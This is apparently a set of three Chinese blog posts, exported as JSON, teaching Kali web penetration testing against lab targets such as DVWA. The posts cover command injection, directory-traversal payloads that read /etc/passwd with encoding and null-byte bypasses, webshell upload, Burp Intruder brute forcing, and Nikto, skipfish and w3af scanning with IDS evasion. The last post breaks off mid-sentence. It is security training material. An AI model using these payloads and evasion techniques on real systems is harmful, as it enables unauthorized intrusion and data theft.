[{"id":"0d0e6471f58d1438d9f4617a6eff85c3","title":"Kali渗透测试-Web【手动漏洞挖掘（一）】","content":"手动漏洞挖掘\n\n\n\n\n\n\n\n\n\n漏洞挖掘原则\n所有变量\n所有头\nCookie中的变量\n\n\n逐个变量删除\n\n\n漏洞的本质\n数据与指令的混淆\n对用户输入信息过滤不严判断失误，误将指令当数据\n\n\n命令执行\n应用程序开发者直接调用系统功能\n;    &amp;&amp;      |      ||     &amp;\n查看源码，过滤用户输入\n\n\n\n命令执行\n加入;或者其他字符进行命令执行\n\n\n\n若直接输入ls等命令不会输出任何结果\n\n\n\n\n\n\n\n\n\n\n\n\n\n可以观察下面的ping命令，ping后面跟的是主机名，而直接输入ls等命令会被误认为是主机名，从而不执行任何操作；分析源码接收客户端输入的ip值赋值给target，先判断是否是windows系统，之后则执行ping + ‘target’，最终将cmd结果显示出来\n\nhigh级别防护\n\n\n\n\n\n\n\n\n\n\n\ntarget接收到客户端的ip后会进行使用stripslashes()函数删除由 addslashes() 函数添加的反斜杠，之后explode()函数将target以.分割为数组赋值给octet，之后判断octet每一个元素是否是数字，若是四个元素都是数字，则将其再以.拼接起来赋值给target，最后再提交给服务端执行cmd；这时候以上提到的;以及管道符都不能进行绕过，需要其他的方法进行绕过。\n目录遍历&#x2F;文件包含\n\n\n\n\n\n\n\n\n\nDirectory traversal &#x2F; File include（有区别&#x2F;没区别）\n目录权限限制不严 &#x2F; 文件包含\n\n\n&#x2F;etc&#x2F;php5&#x2F;cgi&#x2F;php&#x2F;ini\nallow_url_include &#x3D; on\n\n\n应用程序功能操作文件，限制不严时导致访问WEB目录以外的文件\n读、写文件、远程执行代码\n\n\n特征但不绝对\n?page&#x3D;a.php\n?home&#x3D;b.html\n?file&#x3D;content\n\n\n经典测试方法\n?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd\n?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd    # 文件系统访问方法，类似URL\n?home&#x3D;main.cgi \n?page&#x3D;http://www.a.com/1.php\nhttp://1.1.1.1/../../../../dir/file.txt\n\n\n编码绕过字符过滤\n. ，%00            # 绕过文件扩展名过滤\n?file&#x3D;a.doc%00.php      # 00截断原理\n\n\n使用多种编码尝试\n\n\n不同操作系统的路径特征字符\n类unix系统\n根目录：&#x2F;\n目录层级分隔符：&#x2F;\n\n\nwindows系统\nC:\\\n\\ 或 &#x2F;\n\n\n\n\n编码（既要能绕过服务器限制，也能够使服务器进行解码）\nurl编码、双层url编码\n%2e%2e%2f          # 解码：..&#x2F;\n%2e%2e%5c          # 解码：..\\\n%252e%252e%255c      # 解码：..\\\n\n\nUnicode&#x2F;UTF-8 编码\n..%c0%af                         # 解码：..&#x2F;\n..%u2216                     \n..%c1%9c                        # 解码：..\\\n\n\n\n\n\n\n\n\n文件上传\n\n\n\n\n\n\n\n\n\n文件上传漏洞\n\n\n\n直接上传webshell\n修改文件类型上传webshell\nMimetype—文件头、扩展名\n\n\n修改扩展名上传webshell\n静态解析文件扩展名时可能无法执行\n\n\n文件头绕过过滤上传webshell\n上传目录权限\n\n实操参考文章：\nhttps://noobxw.github.io/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/\n","slug":"Kali渗透测试-Web【手动漏洞挖掘（一）】","date":"2023-01-31T08:33:01.000Z","categories_index":"Kali","tags_index":"Kali,漏洞挖掘","author_index":"Aurora"},{"id":"22f1f23e2016f6b45a27c45231798df8","title":"Kali渗透测试-Web渗透【神器】","content":"Burpsuite\n\n\n\n\n\n\n\n\n\nWeb安全工具中的瑞士军刀\n统一的集成工具发现全部现代WEB安全漏洞\nPortSwigger公司开发\nBurp Free\nBurp Professional\nhttp://www.portswigger.net\n\n\n所有的工具共享一个能处理并显示HTTP消息的可扩展框架，模块之间无缝交换信息\n\nProxy\nOptions\n\n\n\n\n\n\n\n\n\n\n\n\nRedirect to host：客户端访问www.x.com域名，Burpsuite就会转发到真实的目标web服务器IP地址（填写转发的真实服务器IP）\nRedirect to port：Burpsuite转发到真实目标web服务器IP的目标端口\nInvisible proxy：客户端程序不支持代理但需要走HTTP协议，为这样的客户端程序实现代理功能\n无论客户端支持或不支持代理；即使不支持代理的情况下，若访问同一个域名对应同一个IP还是多个域名对应多个IP的情况，都可以通过Burpsuite进行代理\n\n\n\n\n\n\n\n\n\n\n截断服务器响应，默认拦截text文本类内容；若是拦截 其他内容可取消勾选\n\n\n\n\n\n\n\n\n\n\n对返回内容的修改\n\n将隐藏的表单显示出来\n将禁用掉的表单激活\n移除输入表单的长度限制\n禁用客户端浏览器JS\n禁用所有JS（会影响一些功能）\n禁用安全标签\n将HTTPS链接转换为HTTP\n移除cookie的安全标签\n\nTarget\n\n\n\n\n\n\n\n\n\nScope（logout）\nFilter \nComparing site map\n\n\n\n\n\n\n\n\n\n\n\n\n浏览过的访问请求都会被记录在Site map中\n也可以使用Filter功能进行过滤\n\n\n\n\n\n\n\n\n\n\n\n其中也可以将需要的网站地址假如Scope方便后续操作，与OWASP_ZAP中的Scope相同\n上面为Include，URL包含在scope中；下面为Exclude排除掉一些不需要的URL\nSpider\n\n\n\n\n\n\n\n\n从Burpsuite2020开始Spider选项卡就没有了，可以使用隐藏的爬网功能\n\n手动爬网\n\n\n\n\n\n\n\n\n\n\n\n可以手动点击网站任何可以提交数据的地方，Site map会自动爬取访问过的页面\n\n自动爬网\n\n\n\n配置爬网信息\n\n\n\n\n\n\n\n\n爬取的结果\n\n\n\n\n\n\n\n\n\n\n\n\n其中爬取的结果可以在Site map中查看\n\n爬取多次进行对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n例如这是两个会话产生的爬网结果，其中可对比出两个会话那些是特有的，那些是一般会话访问不到的\nScan\n\n\n\n\n\n\n\n\n\n\n根据需要配置Scan信息\nIntruder\n\n\n\n\n\n\n\n\n用来Fuzzer和暴力破解\n\n四种攻击模式\nSniper （狙击手）\n\n\n\n\n\n\n\n\n\n表示如果爆破点设置一个，simplelist如果是6个，就执行6次，如果爆破点设置两个，则执行12次，一般这个模式下只设置一个爆破点，因为如果用户名和密码都不知道的情况下不会使用该模式去爆破。通常用于在知道用户名后，对密码进行爆破。原理如下图所示：\n\n\nBattering ram（工程锤）\n\n\n\n\n\n\n\n\n\n\n\n表示两个爆破点使用同一个play依次去执行，如果simplelist是6个，那么就执行6次。原理如下图所示：\n\n\npitch-fork（叉子）\n\n\n\n\n\n\n\n\n\n\n这个模式下，表示两个爆破点，并且会设置两个payload1和payload2，payload1就设置给爆破点1，payload2就设置给爆破点2，总共也是执行6次。并且一般按照payload少的执行。\n\n\ncluster bomb（集束炸弹）\n\n\n\n\n\n\n\n\n\n\n表示如果有两个爆破点，同时设置两个payload1，和payload2，simplelist是6个和7个，那么就会执行一个笛卡尔积的次数。即就是42次。\n\n参考文章：\nhttps://blog.csdn.net/liweibin812/article/details/107428616\nSettings\nRequest Headers（请求头）\n\n\n\n\n\n\n\n\n\n\nUpdate Content-Length header – 保证burpsuite在每次攻击的时候它的Content-Length是正确的\nSet Connection: close - 保证burpsuite在每次攻击的时候它的每次请求连接是close，这样速度更快\n上面两个参数默认就是勾选的，日常测试的过程中也是需要的\n\n\nGrep Match（grep匹配响应信息中的关键字）\n\n\n\n\n\n\n\n\n\n\n在进行暴力破解的时候，有些无法通过状态码或者长度判断出是都破解成功，这时候需要进行匹配关键字设置，通过配置特定的破解成功的关键字即可，需要取消勾选Exclude HTTP header。\n主要是用来从服务端响应的信息中匹配攻击者设置好的关键字，如果匹配了，那么就在攻击的结果中添加新列并标明，这里最终的显示结果是新增的列下面每个攻击请求有个复选框，如果匹配上了就会打勾，否则就没有\n\n\nGrep Extract（grep提取响应信息中的关键字，每行都显示）\n\n\n\n\n\n\n\n\n\n\n用来从服务端响应的信息提取攻击者设置好的关键字信息，并且将有用的信息显示在每次攻击的请求列中显示，前提是有设置好的关键字，否则显示为空\nGrep Payloads（提取响应信息中包含攻击时的payload的关键字）\n​\t提取服务端响应的信息中是否包含Payload值\n​\tPS：注意的是Match against pre-URL-encoded payloads，如果你在请求消息时配置了 URL-encode payloads 则这里表示匹配未编码之前的Payload值，而不是转码后的值。\n\n\nGrep Payloads（提取响应信息中包含攻击时的payload的关键字）\n\n\n\n\n\n\n\n\n\n\n提取服务端响应的信息中是否包含Payload值\n​\tPS：注意的是Match against pre-URL-encoded payloads，如果你在请求消息时配置了 URL-encode payloads 则这里表示匹配未编码之前的Payload值，而不是转码后的值。\n\n\nRedirections（重定向）\n\n\n\n\n\n\n\n\n\n\n根据实际测试情况判断在攻击测试的时候是否需要重定向。\n\nPayload Type\nSimple list（简单列表）\n\n自定义手工添加，Burpsuite默认列表手工添加，从剪贴板粘贴，从文件中加载\n\n\nRuntime file（运行时文件）\n\n直接选择一个文件加载进去即可\n\n\nCustom iterator（自定义迭代器）\n\n功能强大，有8个站位，每一个站位可以指定简单列表payload的类型，然后根据站位的多少，和每一个简单列表的payload进行笛卡尔积生成最终的payload，例如：有个参数值类型是username@@@password，那么就要设置3给站位\n\n\nCharacter substitution（字符串替换）\n\n根据预先定义好的字符串替换的规则，在payload执行的过程中按照规则匹配替换\n\n\nCase modification（大小写替换）\n\n根据预定义的大小写替换规则，在payload执行的过程中按照规则匹配替换，这期间经过规则生成的新payload是从上到下的顺序，依次是：No change(不改变使用原来的字符串)，To lower（转换为小写），To Upper case（转换为大写），To Propername（首字母大写，其他小写），To ProperName（首字母大写，其他不变）\n\n\nRecursive grep（递归grep）\n\n基于服务端响应的数据提取payload，然后使用提取的payload进行攻击，配置payload在options配置\n\n\nIllegal Unicode（非法的Unicode编码）\n\n在进行攻击的时候指定payload里面加入非法的Unicode编码，功能选项不太好理解\n\n\nCharacter blocks（字符块）– 可以理解为字符长度\n\n根据要求给出的一个字符串，然后指定设置产生指定大小的字符块，最终的结果展示为生成指定长度的字符串，一般用在边界测试或者缓冲区溢出中\n\n\nNumber（数字类型）\n\n数字范围：根据要求生成序列数字，随机数字\n数字格式：\n十进制：\nMin integer digits -&gt; 最小的整数个数有几个，简单点理解就是小数点前面最少有几位数\nMax integer didits -&gt; 最大的整数个数有几个，简单点理解就是小数点前面最多有几位数\n\n\nDate（日期类型）\n\n根据要求生成一序列各种格式的日期\n\n\nBrute Forcer（暴力破解）\n\n生成一个包含特定字符集的排列组合，一般都是用来穷尽账号密码用途\n\n\nNull payloads（空payload）\n\n在每个请求中添加null，实际查看就是没有更改原始请求重复发送给服务端\n\n\nCharacter frobber（字符frobber）\n\n依次修改字符串中每个字符位置的值，每次都是在原来的字符串上递增一个该字符的ASCII码，通常使用的场景是目标系统使用了负载的会话令牌用来跟踪会话，如果修改了其中单个字符的值，不影响会话的下一步处理\n\n\nBit flipper（Bit翻转）\n\n对预设的payload原始值按照比特位的形式依次修改\n\n\nUsername generator（用户名生成器）\n\n主要用于用户名和电子邮件账号的自动生成\n\n\nECB block shuffler（ECB加密块洗牌）\n\n基于ECB加密模式的Payload生成器\n\n\nExtension-generated（payload扩展插件生成）\n\n基于Burp插件来生成Payload值，因此使用前必须安装配置Burp插件，在插件里注册一个Intruder\npayload生成器，供此处调用，这里测试安装的插件是Bradamsa\n\n\nCopy other payload（复制其他的payload）\n\n这种类型的Payload是将其他位置的参数复制到Payload位置上，作为新的Payload值，通常适用于多个参数的请求消息中，它的使用场景可能是： 1.两个不同的参数需要使用相同的值，比如说，用户注册时，密码设置会输入两遍，其值也完全一样，可以使用此Payload类型。 2.在一次请求中，一个参数的值是基于另一个参数的值在前端通过脚本来生成的值，可以使用此Payload类型\n\n\n\n文章来源：\nhttps://www.jianshu.com/p/fd0e0fdb9245\nRepeater\n\n\n\n\n\n\n\n\n重放模块，用于多次重放请求、响应和手工修改请求消息，以及修改后对服务器端响应的消息分析\n\n\n右键根据需要选择\n\n\nSequencer\n\n\n\n\n\n\n\n\n用于检测数据样本随机性质量的工具，通常用于检测访问令牌是否可预测、密码重置令牌是否可预测等场景，通过Sequencer不断发包，抓取对应的token值等等，对这些随机令牌的样本，进行数据分析，能很好地降低这些关键数据被伪造的风险。\n\n分析程序中可预测的数据\nSession cookies\nanti-CSRF tokens\nStart live capture\nAnalyze（数据越多分析越准确）\n伪随机算法\nCharacter-level\nBit-level\n\n\n\n\nFIPS—美国联邦信息处理标准(Federal Information Processing Standard)\n\n\nAWVS\n\n\n\n\n\n\n\n\n\nACUNETIX WEB VULNERABILITY SCANNER\n\n自动手动爬网。支持AJAX，JavaScript\n\nAcuSensor灰盒测试\n\n发现爬网无法发现文件\n额外的漏洞扫描\n可发现存在漏洞的源码行号\n支持PHP、.NET（不获取源码的情况下注入已编译.NET）\n\n\n生成PCL、27001标准和规报告\n\n生成给不同级别的人看的报告\n\n\n网络扫描\n\nFTP、DNS、SMTP、IMAP、POP3、SSH、SNMP、Telnet\n集成openvas扫描漏洞\n\n\n\n自动爬网\nOverview\n\n\n\n\n\n\n\n\n\n\n查看扫描总体结果\n\n\nDiscovery\n\n\n\n\n\n\n\n\n\n\n发现功能，可以自定义配置Settings：匹配email、Website等信息；Inclusions：可添加需要发现IP、组织信息和域名；Exclusions：排除不需要发现的IP、组织信息和域名\n\n\nTargets\n\n\n\n\n\n\n\n\n\n\n目标功能，添加扫描信息以及描述，也可以添加Target Group进行扫描\n\n\n\nScans\n\n\n\n\n\n\n\n\n\n\n扫描功能，添加&#x2F;删除新的扫描，以及扫描完成之后自动生成Report；Report可以根据需要生成特定的报告，也可以查看Report Templates了解详细信息\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n配置扫描信息\n\n\n\nVulunerabilities\n\n\n\n\n\n\n\n\n\n\n扫描出的漏洞可以在Vulunerabilities中进行查看，危害级别，漏洞类型，以及URL等信息；其中Export也可以导出Web应用防火墙（WAF）支持的格式；生成漏洞报告等\n\n\nScan Profiles\n\n\n\n\n\n\n\n\n\n\n扫描配置，其中包含了AWVS默认的几个扫描配置，也可以自定义扫描配置\n\n\nNetwork Scanner Settings\n\n\n\n\n\n\n\n\n\n\nAWVS还支持网络扫描，可配置目标IP，目标Port，身份认证的用户名和密码以及需要使用的Protocol\n\n\nIssue Trackers\n\n\n\n\n\n\n\n\n\n\n问题跟踪器，可配置问题跟踪平台如github、gitlab、JIRA等\n\n","slug":"Kali渗透测试-Web渗透【神器】","date":"2023-01-30T03:01:45.000Z","categories_index":"Kali","tags_index":"Kali","author_index":"Aurora"},{"id":"07bd6637ce5349fc443c73445b9bc54b","title":"Kali渗透测试-Web渗透【扫描工具】","content":"Httrack\n\n\n\n\n\n\n\n\nweb侦察工具；对目标网站进行复制克隆，将目标网站所有的页面都复制下来到本地；目的为了减少与目标服务器进行交互，防止侦察时被发现。\n\n运行httrack\nEnter project name :输入项目名称\nBase path (return&#x3D;&#x2F;root&#x2F;websites&#x2F;) :拷贝下来的目标网站页面的存储位置\nEnter URLs (separated by commas or blank spaces) :输入访问网站的起始路径\n\n\n\n\n\n\n\n\n\n\n\n\n\nAction选项：\n\n直接镜像，镜像站点\n使用向导完成镜像\n只下载某些文件（xls、doc、pdf等）\n镜像当前URL的所有链接\n只测试当前URL下的所有链接\n\n\n\n\n\n\n\n\n\n\n\n\nProxy：使用代理选项，防止IP被封\n\n免费代理网站（小心使用）：\nhttps://www.sabaitechnology.com/hide-my-ass/\n\n\n\nYou can define wildcards, like: -*.gif +www.*.com/*.zip -*img_*.zip\nWildcards (return&#x3D;none) :定义通配符，指定特定的包，例如：-*.gif +www.*.com/*.zip -*img_*.zip（*代表所有）\n\nYou can define additional options, such as recurse level (-r), separated by blank spacesTo see the option list, type helpAdditional options (return&#x3D;none) :定义额外的选项（-r：递归多少层查询所有的页面）\n\nReady to launch the mirror? (Y&#x2F;n) :开始镜像\n\n\n\n\n\n\n\n\n\n\n\n\n\n以上就是从dvwa网站下载到本地的dvwa目录中；下载完之后每一个页面就可以搜索信息：泄露出的内网地址，应用程序架构，email信息等\n扫描工具\n\n\n\n\n\n\n\n\n在Web层面的扫描工具，与通用型的扫描工具（nessus&#x2F;openvas）有所不同；\n基于Web的扫描工具大部分都支持两种扫描模式：1、代理截断模式；2、主动扫描模式\n手动扫描：自己将所有目标页面进行探测，所有的提交表单的部分，所有的各种功能，手动登录表单，手动点击每一个页面，发现那些参数可以注入等\n自动扫描：可以辅助手动扫描（手动扫描看不到一些隐藏的内容）；但也不能过于依赖自动扫描\nNikto\n\n\n\n\n\n\n\n\n纯主动扫描模式\n\nPerl语言开发的开源web安全扫描器\n软件版本\n搜索存在安全隐患的文件\n服务器配置漏洞\nWEB Application层面的安全隐患\n避免404误判\n很多服务器不遵守RFC标准，对于不存在的对象返回200响应码\n依据响应文件内容判断，不同扩展名的文件404响应内容不同\n去除时间信息后的内容取MD5值\n-no404参数：降低扫描准确度，不建议使用此参数\n\n\n\n\n升级数据库及插件\n\nnikto -update\n\n\n\n\n\n\n\n\n\n\n\n由于神奇的国度，需要挂外网才能升级数据库及插件\n\n各种类型插件\n\nnikto -list-plugins\n\n\n\n指定URL扫描\n\nnikto -host http://192.168.216.167/dvwa\n\n\n\n指定端口扫描\n\nnikto 192.168.216.167 -port 80\n\n\n\n支持SSL扫描\n\nnikto -host &lt;域名&gt; -prot 443 -ssl\n\n\n\n使用nmap扫描IP段再交给nikto进行漏扫\n\nnmap -p80 192.168.216.0/24 -oG - | nikto -host -\n\n\n\n\n\n\n\n\n\n\n-oG：扫描结果输出出来；第一个-：输出的结果；第二个-：nmap扫描出来开放80端口的IP\n\n\n使用代理\n\nnikto -host 192.168.216.167 -useproxy &lt;代理地址&gt;\n\n\nNikto-interactive\n\n\n\n\n\n\n\n\n\n扫描过程当中用于交互的命令\nSpace – report current scan status  # 回车，报告当前扫描的状态\nv – verbose mode on&#x2F;off    # 显示详细的信息\nd – debug mode on&#x2F;off   #  debug信息，查看最详细的信息\ne – error reporting on&#x2F;off   # 查看错误报告信息\np – progress reporting on&#x2F;off   # 扫描进度\nr – redirect display on&#x2F;off        # 显示服务器发送给客户端的所有重定向\nc – cookie display on&#x2F;off           # 显示服务器发送给客户端的所有cookie\na – auth display on&#x2F;off               # 显示身份认证过程\nq – quit                               # 退出\nN – next host                 # 扫描下一个主机\nP - Pause                      # 暂停扫描\n\n设置配置文件\n\n修改UA头等信息进行伪装\n\n\n\n设置cookie认证信息\n\n\n\n躲避IDS技术\n\n-evasion\n\n\n\n\n\n\n\n\n\n\n使用LibWhisker中对IDS的躲避技术，可使用以下几种类型：\n\n随机URL编码（非UTF-8方式）\n自选择路径（&#x2F; .&#x2F;）\n过早结束的URL\n优先考虑长随机字符串\n参数欺骗\n使用TAB作为命令的分隔符\n使用变化的URL\n使用Windows路径分隔符&quot;\\&quot;\n\n\n\n\n\n\n\nVega\n\n\n\n\n\n\n\n\n图形化工具，两种模式兼可\n\nJAVA编写的开源Web扫描器\n扫描模式\n代理模式\n爬站、处理表单、注入测试\n支持SSL：http://vega/ca.crt\n\n新版本kali没有默认安装，需要手动安装\n官网下载地址：https://subgraph.com/vega/download/index.en.html\n安装参考文章：https://blog.csdn.net/weixin_56542574/article/details/124110420\nskipfish\n\n\n\n\n\n\n\n\n\nC语言编写\n实验性的主动web安全评估工具\n递归爬网\n基于字典的探测\n速度较快\n多路单线程，全异步网络I&#x2F;O，消除内存管理和调度开销\n启发式自动内容识别\n\n\n误报较低\n\n\n\n\n\n\n\n\n\n\n扫描参数说明：\n-I （i）：只检查包含’string’的URL   【适用于大型网站】\n-X：不检查包含’string’的URL  【如：logout】\n-K：不对指定参数进行Fuzz测试\n-D：跨站点爬另一个域【即目标页面中有另一个域名，则进行扫描】\n-l：每秒最大请求数\n-m：每IP最大并发连接数【依据带宽】\n–config：指定配置文件 【将参数命令写入一个配置文件】\n\n使用skipfish必须要加-o参数\n\nskipfish -o test http://192.168.216.167\n\n\n\n\n\n\n\n\n\n\n-o：后面必须跟一个目录文件，将扫描报告存入此目录\ntest：指定的目录，不存在自动创建\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n其中扫描结果生成的报告存放在test/index.html中\n\n-I指定扫描\n\nskipfish -o test1 -I &#x2F;dvwa&#x2F;  http://192.168.216.167/dvwa/\n\n字符串中包含dvwa字符串的才会扫描，不包含就不扫描\n\n\n使用.txt文件进行批量扫描\n\nskipfish -o test @url.txt\n\n\n\n\n\n\n\n\n\nurl.txt：存放地址的文本文件\n\n\n\n指定内置字典扫描隐藏内容\n\n字典存放路径\n\n\nskipfish -o test -S &#x2F;usr&#x2F;share&#x2F;skipfish&#x2F;dictionaries&#x2F;minimal.wl http://192.168.216.167/dvwa/\n\n\n\n\n指定特定内容\n\n\n\n\n\n\n\n\n\n爬站时候发现此网站一些特有的目录内容和特征字符，可以将特征字符存下来通过-W，指定空文件a.wl再将特有的目录内容和特征字符写入其中进行扫描\n\nskipfish -o test -S complet.wl -W a.wl http://1.1.1.1\n\n\n\n\n跨站扫描\n\n\n\n\n\n\n\n\n\n-D参数：当扫描当前站点时，若此目标网站有连接到新的站点的话，会直接跳到新的站点进行扫描\n\nskipfish -o test3 -D www.w3.org -I /dvwa/ -S /usr/share/skipfish/dictionaries/minimal.wl http://192.168.216.167/dvwa/\n\n\n\n指定每秒最大扫描数\n\nskipfish -o test3 -l 20 -I /dvwa/ -S /usr/share/skipfish/dictionaries/minimal.wl http://192.168.216.167/dvwa/\n\n\n\n每个IP的并发连接数（影响）\n\nskipfish -o test3  -m 10 -I /dvwa/ -S /usr/share/skipfish/dictionaries/minimal.wl http://192.168.216.167/dvwa/\n\n\n\n\nskipfish身份认证\n基本身份认证\n\nskipfish -A user:pass -o test http://1.1.1.1\n\n\nCookie身份认证\n\nskipfish -C “name&#x3D;val” -o test http://1.1.1.1\n\n找到cookie信息\n\n\n\n\n构造命令\n\nskipfish -o test -C &quot;PHPSESSID=42c5a86191d270eea8ccc77eea52f9c6&quot; -C &quot;security=low&quot; -I dvwa http://192.168.216.167/dvwa/\n\n\n\n按回车显示详细信息\n\n\n\n\n\n\n\n\n\n\n\n使用登录的方式进行扫描\n\n\n\n直接提交表单的方式将身份认证信息提交给web\n\n\n\n\n\n\n\n\n\n有些web使用cookie无法进行身份认证就要直接提交表单\n\nman skipfish\n\n\n\n\n\n\n\n\n\n\n\n–auth-form ：提交表单的来源\n–auth-form-target：指定表单目标\n–auth-user-filed：指定用户名表单名\n–auth-pass-filed：指定密码表单名\n–auth-user ：提交用户名\n–auth-pass ：提交密码\n–auth-verify-url ：验证URL地址\n\nskipfish -o test1 --auth-form http://192.168.216.167/dvwa/login.php --auth-form-target http://192.168.216.167/dvwa/login.php --auth-user-field username --auth-user admin --auth-pass-field password --auth-pass password --auth-verify-url http://192.168.216.167/dvwa/index.php -I /dvwa/ -X logout.php http://192.168.216.167/dvwa/\n\n\n\n\n\n\nw3af\n\n\n\n\n\n\n\n\n\nWeb Application Attack and Audit Framework҅，基于python语言开发\n此框架的目标是帮助你发现和利用所有WEB应用程序漏洞\n9大类近150个plugin\naudit                               # 审计\ninfrastructure               # 基础架构 \ngrep                               # 被动扫描\nevasion                         # 逃避IPS&#x2F;WAF&#x2F;IDS等\nmangle                         # 基于正则表达式的内容的替换 \nauth                              # 身份认证\nbruteforce                   # 暴力破解\noutput                          # 扫描出的结果输出格式（xml，txt等）\ncrawl                             # 爬网\nattack                          # 攻击模式（不可修改，固定攻击模式）\n\n\n\n安装\n切换python版本\n\nupdate-alternatives –install &#x2F;usr&#x2F;bin&#x2F;python python &#x2F;usr&#x2F;bin&#x2F;python2 100\nupdate-alternatives –install &#x2F;usr&#x2F;bin&#x2F;python python &#x2F;usr&#x2F;bin&#x2F;python3 150\n切换版本号\nupdate-alternatives –config python\n\n\n\n\n\n\n\n\n\n\n\n\n100和150用于优先级（150&gt;100）\nupdate-alternatives命令：其作用是进行软件版本的切换，Linux发行版中均可用此命令\n\n\n\n\n安装docker\n\nhttps://blog.csdn.net/qq_41832837/article/details/103948314\n\ncurl -fsSL https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian&#x2F;gpg | sudo apt-key add -\n\necho &#39;deb https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian stretch stable&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list\n\napt-get install apt-transport-https  ca-certificates  curl  gnupg2  software-properties-common\n\napt-get update\n\napt install docker.io\n\ndocker   # 用于检查docker是否正常安装\n\ndocker下载 w3af 镜像\n\ndocker pull andresriancho/w3af\n\n\ngit下载 w3af 软件包\n\ngit clone https://github.com/andresriancho/w3af.git\n\n\n运行脚本\ncd w3af&#x2F;extras&#x2F;docker&#x2F;scripts&#x2F;\n.&#x2F;w3af_console_docker\n\n运行上面脚本之前切换到python2，否则会报错\n\npassword为w3af\n输入y接受免责协议\n\n\n\n\n\n\n\n\n\n\n\n以上安装的是w3af命令行模式\n\n\nw3af使用升级\ngit pull       # 在w3af目录下执行\n\n\n\n\n\n\n\n\n\n\nw3af基本描述\nstart：开始扫描\nplugins：插件模块\nexploit：攻击模块\nprofiles：列出并使用扫描配置文件\n\nW3af_console\n\nhelp                                           # 显示可用指令\nplugin                                        # 进入plugin子命令\nHelp                                    # 显示可用指令\nlist audit                             # 列出audit类所有插件\naudit sqli xss                     # 选择使用audit类插件\n\n\n\n\nhttp-settings &#x2F; misc-settings         # 全局配置 \n\nhelp\nview                                           # 查看可配置的参数\nset                                              # 设置参数\nback                                           # 回到上一级命令\n\n\n\n\n插件类型\n列出具体的插件选择扫描插件\n自定义扫描配置文件\n\nProfiles\n\nsave_as self-contained\nsave_as test self-contained   # 完全独立存在的配置文件（包含字典文件，外部引用的文件，可拷贝给其他人使用）\n\n\nTarget\n• set target http://1.1.1.1/  # 设置扫描目标\n\nStart   # 开启扫描\n\nScript\n\nscript&#x2F;*.w3af\n\n默认脚本路径\n\n\n\n\n\n\n\n\n\n\n\n\n可将经常使用的命令集成到脚本中，扫描时调用脚本即可\n\n\n\n\nw3af—身份认证\n\n\n\n\n\n\n\n\n\nHTTP Basic                  # HTTP基本身份认证\nNTLM                           # 基于NTLM的身份认证\nForm                            # 基于表单的身份认证\nCookie                         # 双因素身份认证&#x2F;anti-CSRF tokens\n\n搭建环境\n\n\n\n\n\n\n\n\n使windows XP提供HTTP基本身份认证和NTLM身份认证\n\n打开”添加或删除应用程序“安装IIS\n\n\n\n\n\n”开始“—&gt;”管理工具“—&gt;“IIS”—&gt;打开”默认网站“—&gt;右键“属性”—&gt;”目录安全性“\n\n\n\n勾选基本身份认证\n\n\n\n此时在kali中访问站点需要身份认证\n\n\n\n\n打开抓包工具只抓取192.168.216.172的包\n\n\n\n\n\n选择（text&#x2F;html）的包右键打开追踪TCP流查看详细信息\n\n\n\n\n\n\n\n\n\n\n\n其中客户端通过Authorization: Basic YWRtaW5pc3RyYXRvcjpwYXNzd29yZA==这个头信息发送给服务端；可以看出来基本身份认证是使用Base64编码\n\n使用在线加解密工具解码\n\n\n使用w3af进行基本身份认证扫描\n配置scan信息\n\n配置http-settings设置基本身份认证方式\n\n\n\n\n\n\n\n\n\n\n\n\n\n其中basic_auth_domain若是域名访问就填写域名，若是IP访问就写IP\n\n配置插件\n\n\n\n\n\n开始扫描\n\n\n\n\n\n\n\n\n\n\n\n其中扫描出是IIS服务器还有很多URL扫描\n\n抓包查看\n\n\n\n\n\n\n\n\n\n\n\n其中UA头是w3af特征表示，扫描时需要修改特征\n使用w3af进行NTLM身份认证扫描\n\n\n\n\n\n\n\n\nNTLM微软专有的身份认证方式，相比较基本认证方式安全性很高\nNTLM基于随机数，双方通过随机数各自用各自的密码进行加密，一方能够解密另一方的密码，说明双方的密码是一样的；客户端向服务器发起访问请求的时候会先提交一个随机数，服务器端会用自己的密码把随机加密，加密之后将密文回传给客户端，客户端再用自己的密码把密文解密，查看拿到的随机数与自己发送的随机是否一样，若相同则是相同的密码。在此过程中传输的是随机数，不会将明文或者密文进行传输。\n\n选择“集成Windows身份认证”\n\n\n\n\n\n\n\n\n\n\n集成Windows身份认证就是NTLM身份认证\n\n\n配置w3af\n\n\n\n\n开始扫描\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n抓包过程中看到是NTLM认证方式，不知道什么原因实验过程中设置为NTLM身份认证方式后，输入正确的用户名和密码都是拒绝访问；抓包图中也是报401的错误，正常情况是可以抓到200的OK包；但是具体流程如上。\n基于From表单的身份认证\n实验环境\n\nDVWA\n\n\n使用w3af的插件auth—&gt;detailed进行表单身份认证\n\n填写身份认证配置信息\n\n\n\n\n\n\n\n\n\n\n\n\n\ncheck_string字段：选择登录页面之后特有的字段\ndata_format字段：数据格式；通过Post请求发送的数据内容，上图中抓取的Post包中username=admin&amp;password=password&amp;Login=Login字段，也可以将此字段直接添加到data_format中；其中默认的变量%u&#x3D;%U：u表示username_field，U表示username值；后面p参数同理。\n\n配置爬网插件信息\n\n\n\n\n\n\n\n\n\n\n勾选only_forward表示只会扫描指定子目录，其中在Target中需加入目录名称；follow_regex默认*表示扫描所有文件，也可自定义扫描jsp/php；ignore_regex表示忽略掉某些文件不去扫描\n\n开始扫描\n\n\n\n\n\n\n\n\n\n\n\n\n\n从扫描的日志可以看到已经成功的进行了身份认证后的扫描\n基于Cookie的身份认证方式\n\n\n\n\n\n\n\n\n双因素身份认证，即使输入正确表单内容也无法正常登录，需要配合Cookie进行身份认证。\n\n配置Cookie文件\n\n\n\n\n\n\n\n\n\n\n\n\ncookie文件必须严格按照w3af要求的格式，必须使用Tab制表符，不能使用空格；\n每一行必须存放一个cookie信息，每一个字段中间使用Tab键来分开\n\n填写域名或者IP\nflag标志位：TRUE&#x2F;FALSE，在这个域中所有的机器是否都可以访问这个变量，TRUE可以，FALSE不